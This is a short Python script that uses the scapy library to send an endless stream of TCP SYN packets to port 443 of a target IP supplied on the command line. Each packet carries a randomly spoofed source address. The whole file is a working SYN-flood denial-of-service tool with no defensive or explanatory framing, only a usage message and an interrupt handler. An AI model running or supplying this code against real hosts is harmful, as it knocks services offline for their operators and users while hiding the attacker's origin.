import sys
from scapy.all import *


def start(argv):
    if len(sys.argv) < 2:
        print(sys.argv[0] + "  <target_ip>")
        sys.exit(0)
    while (1):
        pdst = sys.argv[1]
        send(IP(src=RandIP(), dst=pdst) / TCP(dport=443, flags="S"))


if __name__ == '__main__':
    # 定义异常
    try:
        start(sys.argv[1:])
    except KeyboardInterrupt:
        print("interrupted by user, killing all threads...")